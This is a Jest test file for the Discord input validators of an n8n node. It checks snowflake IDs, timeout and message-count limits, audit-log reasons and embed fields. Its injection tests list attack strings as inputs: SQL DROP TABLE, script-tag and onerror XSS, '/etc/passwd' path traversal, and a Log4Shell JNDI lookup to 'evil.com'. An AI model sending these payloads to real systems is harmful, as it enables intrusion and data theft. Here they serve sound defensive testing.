/**
 * Priority 2: Enhanced Discord Validation & Security Tests
 *
 * Comprehensive testing of discord-validation.ts with focus on:
 * - Edge cases and boundary conditions
 * - Input sanitization and validation
 * - Security scenarios
 * - Error handling and message quality
 *
 * Target: 50%+ coverage for validation module
 */

import type { IExecuteFunctions } from 'n8n-workflow'
import { NodeOperationError } from 'n8n-workflow'
import {
  validateDiscordSnowflake,
  validateChannelId,
  validateUserId,
  validateGuildId,
  validateMessageId,
  validateRoleId,
  validateDiscordSnowflakeArray,
  validateTimeoutDuration,
  validateMessageCount,
  validateDeleteMessageDays,
  validateAuditLogReason,
  validateEmbedField,
} from '../../../src/nodes/Discord/shared/validation/discord-validation'

// Mock IExecuteFunctions
const mockExecuteFunctions = {
  getNode: jest.fn(() => ({
    id: 'test-node',
    name: 'Discord Test',
    type: 'n8n-nodes-discord.discord',
    typeVersion: 1,
    position: [0, 0] as [number, number],
    parameters: {},
  })),
} as unknown as IExecuteFunctions

describe('Discord Validation - Priority 2 Enhanced Testing', () => {
  describe('Snowflake Validation - Security & Edge Cases', () => {
    describe('Valid Snowflake Scenarios', () => {
      test('should validate minimum length snowflakes (17 digits)', () => {
        const minSnowflake = '12345678901234567' // 17 digits
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, minSnowflake, 'user')).not.toThrow()
      })

      test('should validate maximum length snowflakes (19 digits)', () => {
        const maxSnowflake = '1234567890123456789' // 19 digits
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, maxSnowflake, 'guild')).not.toThrow()
      })

      test('should validate typical 18-digit snowflakes', () => {
        const typicalSnowflake = '123456789012345678'
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, typicalSnowflake, 'channel')).not.toThrow()
      })

      test('should handle all snowflake types correctly', () => {
        const snowflake = '123456789012345678'
        const types = ['user', 'guild', 'channel', 'message', 'role'] as const

        types.forEach((type) => {
          expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, snowflake, type)).not.toThrow()
        })
      })
    })

    describe('Invalid Snowflake Security Tests', () => {
      test('should reject null/undefined input', () => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, null as unknown as string, 'user')).toThrow(
          NodeOperationError,
        )
        expect(() =>
          validateDiscordSnowflake.call(mockExecuteFunctions, undefined as unknown as string, 'user'),
        ).toThrow(NodeOperationError)
      })

      test('should reject empty strings', () => {
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, '', 'user')).toThrow(NodeOperationError)
      })

      test('should reject non-string types', () => {
        const invalidTypes = [123, {}, [], true, false]
        invalidTypes.forEach((invalid) => {
          expect(() =>
            validateDiscordSnowflake.call(mockExecuteFunctions, invalid as unknown as string, 'user'),
          ).toThrow(NodeOperationError)
        })
      })

      test('should reject too short snowflakes (< 17 digits)', () => {
        const tooShort = '1234567890123456' // 16 digits
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, tooShort, 'user')).toThrow(NodeOperationError)
      })

      test('should reject too long snowflakes (> 19 digits)', () => {
        const tooLong = '12345678901234567890' // 20 digits
        expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, tooLong, 'user')).toThrow(NodeOperationError)
      })

      test('should reject non-numeric strings', () => {
        const nonNumeric = [
          'abcdefghijklmnopqr', // letters
          '123456789012345abc', // mixed
          '123 456 789 012 345', // spaces
          '123-456-789-012-345', // dashes
          '123.456.789.012.345', // dots
        ]

        nonNumeric.forEach((invalid) => {
          expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, invalid, 'user')).toThrow(NodeOperationError)
        })
      })

      test('should handle injection attempts', () => {
        const injectionAttempts = [
          "'; DROP TABLE users; --",
          '<script>alert("xss")</script>',
          '../../../etc/passwd',
          '${jndi:ldap://evil.com}',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        ]

        injectionAttempts.forEach((attempt) => {
          expect(() => validateDiscordSnowflake.call(mockExecuteFunctions, attempt, 'user')).toThrow(NodeOperationError)
        })
      })
    })

    describe('Error Message Quality', () => {
      test('should provide descriptive error messages with type context', () => {
        try {
          validateDiscordSnowflake.call(mockExecuteFunctions, 'invalid', 'channel')
          fail('Should have thrown an error')
        } catch (error) {
          expect(error).toBeInstanceOf(NodeOperationError)
          const nodeError = error as NodeOperationError
          expect(nodeError.message).toContain('channel')
          expect(nodeError.message).toContain('invalid')
          expect(nodeError.message).toContain('snowflake')
        }
      })

      test('should handle standalone validation (no IExecuteFunctions)', () => {
        expect(() => validateDiscordSnowflake.call(undefined, 'invalid', 'user')).toThrow(Error)
        expect(() => validateDiscordSnowflake.call(undefined, 'invalid', 'user')).not.toThrow(NodeOperationError)
      })
    })
  })

  describe('Specialized ID Validation Functions', () => {
    test('validateChannelId should validate channel snowflakes', () => {
      expect(() => validateChannelId.call(mockExecuteFunctions, '123456789012345678')).not.toThrow()

      expect(() => validateChannelId.call(mockExecuteFunctions, 'invalid')).toThrow(NodeOperationError)
    })

    test('validateUserId should validate user snowflakes', () => {
      expect(() => validateUserId.call(mockExecuteFunctions, '123456789012345678')).not.toThrow()

      expect(() => validateUserId.call(mockExecuteFunctions, 'invalid')).toThrow(NodeOperationError)
    })

    test('validateGuildId should validate guild snowflakes', () => {
      expect(() => validateGuildId.call(mockExecuteFunctions, '123456789012345678')).not.toThrow()

      expect(() => validateGuildId.call(mockExecuteFunctions, 'invalid')).toThrow(NodeOperationError)
    })

    test('validateMessageId should validate message snowflakes', () => {
      expect(() => validateMessageId.call(mockExecuteFunctions, '123456789012345678')).not.toThrow()

      expect(() => validateMessageId.call(mockExecuteFunctions, 'invalid')).toThrow(NodeOperationError)
    })

    test('validateRoleId should validate role snowflakes', () => {
      expect(() => validateRoleId.call(mockExecuteFunctions, '123456789012345678')).not.toThrow()

      expect(() => validateRoleId.call(mockExecuteFunctions, 'invalid')).toThrow(NodeOperationError)
    })
  })

  describe('Array Validation - Bulk Operations Security', () => {
    test('should validate arrays of valid snowflakes', () => {
      const validSnowflakes = ['123456789012345678', '987654321098765432', '555666777888999000']

      expect(() => validateDiscordSnowflakeArray.call(mockExecuteFunctions, validSnowflakes, 'user')).not.toThrow()
    })

    test('should reject non-array input', () => {
      const nonArrays = ['string', 123, {}, null, undefined]

      nonArrays.forEach((nonArray) => {
        expect(() =>
          validateDiscordSnowflakeArray.call(mockExecuteFunctions, nonArray as unknown as string[], 'user'),
        ).toThrow(NodeOperationError)
      })
    })

    test('should validate each element in array', () => {
      const mixedArray = [
        '123456789012345678', // valid
        'invalid', // invalid
        '987654321098765432', // valid
      ]

      expect(() => validateDiscordSnowflakeArray.call(mockExecuteFunctions, mixedArray, 'user')).toThrow(
        NodeOperationError,
      )
    })

    test('should handle empty arrays', () => {
      expect(() => validateDiscordSnowflakeArray.call(mockExecuteFunctions, [], 'user')).not.toThrow()
    })

    test('should prevent DoS via large arrays', () => {
      // Test with moderately large array to ensure performance
      const largeArray = new Array(1000).fill('123456789012345678')
      const startTime = Date.now()

      expect(() => validateDiscordSnowflakeArray.call(mockExecuteFunctions, largeArray, 'user')).not.toThrow()

      const endTime = Date.now()
      expect(endTime - startTime).toBeLessThan(1000) // Should complete within 1 second
    })
  })

  describe('Timeout Duration Validation - Security Boundaries', () => {
    test('should accept valid timeout durations', () => {
      const validDurations = [1, 60, 3600, 86400, 604800] // 1s, 1m, 1h, 1d, 1w

      validDurations.forEach((duration) => {
        expect(() => validateTimeoutDuration.call(mockExecuteFunctions, duration)).not.toThrow()
      })
    })

    test('should reject negative durations', () => {
      expect(() => validateTimeoutDuration.call(mockExecuteFunctions, -1)).toThrow(NodeOperationError)
      expect(() => validateTimeoutDuration.call(mockExecuteFunctions, -3600)).toThrow(NodeOperationError)
    })

    test('should reject non-numeric types', () => {
      const nonNumbers = ['60', null, undefined, {}, [], true]

      nonNumbers.forEach((nonNumber) => {
        expect(() => validateTimeoutDuration.call(mockExecuteFunctions, nonNumber as unknown as number)).toThrow(
          NodeOperationError,
        )
      })
    })

    test('should enforce Discord 28-day maximum limit', () => {
      const maxTimeout = 28 * 24 * 60 * 60 // 28 days in seconds

      expect(() => validateTimeoutDuration.call(mockExecuteFunctions, maxTimeout)).not.toThrow()

      expect(() => validateTimeoutDuration.call(mockExecuteFunctions, maxTimeout + 1)).toThrow(NodeOperationError)
    })

    test('should handle edge case durations', () => {
      expect(() => validateTimeoutDuration.call(mockExecuteFunctions, 0)).not.toThrow() // 0 is valid (remove timeout)

      expect(() => validateTimeoutDuration.call(mockExecuteFunctions, 0.5)).not.toThrow() // Fractional seconds should be allowed
    })
  })

  describe('Message Count Validation - Bulk Operation Limits', () => {
    test('should accept valid message counts', () => {
      const validCounts = [1, 10, 50, 100]

      validCounts.forEach((count) => {
        expect(() => validateMessageCount.call(mockExecuteFunctions, count)).not.toThrow()
      })
    })

    test('should reject counts outside Discord limits', () => {
      expect(() => validateMessageCount.call(mockExecuteFunctions, 0)).toThrow(NodeOperationError)
      expect(() => validateMessageCount.call(mockExecuteFunctions, 101)).toThrow(NodeOperationError)
    })

    test('should reject non-numeric types', () => {
      const nonNumbers = ['10', null, undefined, {}, [], true]

      nonNumbers.forEach((nonNumber) => {
        expect(() => validateMessageCount.call(mockExecuteFunctions, nonNumber as unknown as number)).toThrow(
          NodeOperationError,
        )
      })
    })

    test('should accept integer counts (fractional allowed by Discord API)', () => {
      // Discord API accepts fractional counts, so we should too
      expect(() => validateMessageCount.call(mockExecuteFunctions, 10.5)).not.toThrow()
      expect(() => validateMessageCount.call(mockExecuteFunctions, 50.7)).not.toThrow()
    })
  })

  describe('Delete Message Days Validation - Ban Security', () => {
    test('should accept valid day counts', () => {
      const validDays = [0, 1, 3, 7]

      validDays.forEach((days) => {
        expect(() => validateDeleteMessageDays.call(mockExecuteFunctions, days)).not.toThrow()
      })
    })

    test('should reject days outside Discord limits', () => {
      expect(() => validateDeleteMessageDays.call(mockExecuteFunctions, -1)).toThrow(NodeOperationError)
      expect(() => validateDeleteMessageDays.call(mockExecuteFunctions, 8)).toThrow(NodeOperationError)
    })

    test('should reject non-numeric types', () => {
      const nonNumbers = ['7', null, undefined, {}, [], true]

      nonNumbers.forEach((nonNumber) => {
        expect(() => validateDeleteMessageDays.call(mockExecuteFunctions, nonNumber as unknown as number)).toThrow(
          NodeOperationError,
        )
      })
    })
  })

  describe('Audit Log Reason Validation - Input Sanitization', () => {
    test('should accept valid reasons', () => {
      const validReasons = [
        'User violated rules',
        'Spam prevention',
        'Automated moderation action',
        'Manual review required',
      ]

      validReasons.forEach((reason) => {
        expect(() => validateAuditLogReason.call(mockExecuteFunctions, reason)).not.toThrow()
      })
    })

    test('should handle undefined/null reasons', () => {
      expect(validateAuditLogReason.call(mockExecuteFunctions, undefined)).toBeUndefined()
      expect(validateAuditLogReason.call(mockExecuteFunctions, null as unknown as string)).toBeUndefined()
    })

    test('should reject non-string types', () => {
      const nonStrings = [123, {}, [], true]

      nonStrings.forEach((nonString) => {
        expect(() => validateAuditLogReason.call(mockExecuteFunctions, nonString as unknown as string)).toThrow(
          NodeOperationError,
        )
      })
    })

    test('should enforce Discord 512 character limit', () => {
      const maxLength = 'a'.repeat(512)
      const tooLong = 'a'.repeat(513)

      expect(() => validateAuditLogReason.call(mockExecuteFunctions, maxLength)).not.toThrow()

      expect(() => validateAuditLogReason.call(mockExecuteFunctions, tooLong)).toThrow(NodeOperationError)
    })

    test('should trim whitespace', () => {
      const reasonWithWhitespace = '  Valid reason  '
      const result = validateAuditLogReason.call(mockExecuteFunctions, reasonWithWhitespace)
      expect(result).toBe('Valid reason')
    })

    test('should handle potential injection attacks in reasons', () => {
      const potentialAttacks = [
        "'; DROP TABLE audit_logs; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com}',
        '../../../etc/passwd',
      ]

      // These should not throw (they're just text), but should be sanitized
      potentialAttacks.forEach((attack) => {
        expect(() => validateAuditLogReason.call(mockExecuteFunctions, attack)).not.toThrow()
      })
    })
  })

  describe('Embed Field Validation - Content Security', () => {
    test('should accept valid embed fields', () => {
      const validFields = [
        { name: 'Field Name', value: 'Field Value' },
        { name: 'Field Name', value: 'Field Value', inline: true },
        { name: 'Field Name', value: 'Field Value', inline: false },
      ]

      validFields.forEach((field) => {
        expect(() => validateEmbedField.call(mockExecuteFunctions, field)).not.toThrow()
      })
    })

    test('should reject fields with missing name', () => {
      const invalidFields = [
        { value: 'Field Value' },
        { name: '', value: 'Field Value' },
        { name: null, value: 'Field Value' },
      ]

      invalidFields.forEach((field) => {
        expect(() =>
          validateEmbedField.call(mockExecuteFunctions, field as unknown as { name: string; value: string }),
        ).toThrow(NodeOperationError)
      })
    })

    test('should reject fields with missing value', () => {
      const invalidFields = [
        { name: 'Field Name' },
        { name: 'Field Name', value: '' },
        { name: 'Field Name', value: null },
      ]

      invalidFields.forEach((field) => {
        expect(() =>
          validateEmbedField.call(mockExecuteFunctions, field as unknown as { name: string; value: string }),
        ).toThrow(NodeOperationError)
      })
    })

    test('should reject non-string name/value types', () => {
      const invalidTypes = [123, {}, [], true]

      invalidTypes.forEach((invalid) => {
        expect(() =>
          validateEmbedField.call(mockExecuteFunctions, { name: invalid as unknown as string, value: 'value' }),
        ).toThrow(NodeOperationError)

        expect(() =>
          validateEmbedField.call(mockExecuteFunctions, { name: 'name', value: invalid as unknown as string }),
        ).toThrow(NodeOperationError)
      })
    })

    test('should enforce Discord field name length limit (256 chars)', () => {
      const maxName = 'a'.repeat(256)
      const tooLongName = 'a'.repeat(257)

      expect(() => validateEmbedField.call(mockExecuteFunctions, { name: maxName, value: 'value' })).not.toThrow()

      expect(() => validateEmbedField.call(mockExecuteFunctions, { name: tooLongName, value: 'value' })).toThrow(
        NodeOperationError,
      )
    })

    test('should enforce Discord field value length limit (1024 chars)', () => {
      const maxValue = 'a'.repeat(1024)
      const tooLongValue = 'a'.repeat(1025)

      expect(() => validateEmbedField.call(mockExecuteFunctions, { name: 'name', value: maxValue })).not.toThrow()

      expect(() => validateEmbedField.call(mockExecuteFunctions, { name: 'name', value: tooLongValue })).toThrow(
        NodeOperationError,
      )
    })

    test('should handle potential XSS in embed fields', () => {
      const xssAttempts = [
        '<script>alert("xss")</script>',
        '<img src="x" onerror="alert(1)">',
        'javascript:alert("xss")',
        '"><script>alert("xss")</script>',
      ]

      // These should not throw (Discord handles HTML escaping), but validate structure
      xssAttempts.forEach((xss) => {
        expect(() => validateEmbedField.call(mockExecuteFunctions, { name: xss, value: 'value' })).not.toThrow()

        expect(() => validateEmbedField.call(mockExecuteFunctions, { name: 'name', value: xss })).not.toThrow()
      })
    })
  })

  describe('Performance & DoS Protection', () => {
    test('should handle concurrent validation calls efficiently', async () => {
      const validSnowflake = '123456789012345678'
      const concurrentCalls = 100

      const startTime = Date.now()

      const promises = Array(concurrentCalls)
        .fill(0)
        .map(() => Promise.resolve(validateDiscordSnowflake.call(mockExecuteFunctions, validSnowflake, 'user')))

      await Promise.all(promises)

      const endTime = Date.now()
      expect(endTime - startTime).toBeLessThan(500) // Should complete within 500ms
    })

    test('should handle validation of maximum-size inputs efficiently', () => {
      const maxAuditReason = 'a'.repeat(512)
      const maxFieldName = 'a'.repeat(256)
      const maxFieldValue = 'a'.repeat(1024)

      const startTime = Date.now()

      // Multiple max-size validations
      for (let i = 0; i < 100; i++) {
        validateAuditLogReason.call(mockExecuteFunctions, maxAuditReason)
        validateEmbedField.call(mockExecuteFunctions, { name: maxFieldName, value: maxFieldValue })
      }

      const endTime = Date.now()
      expect(endTime - startTime).toBeLessThan(1000) // Should complete within 1 second
    })
  })
})
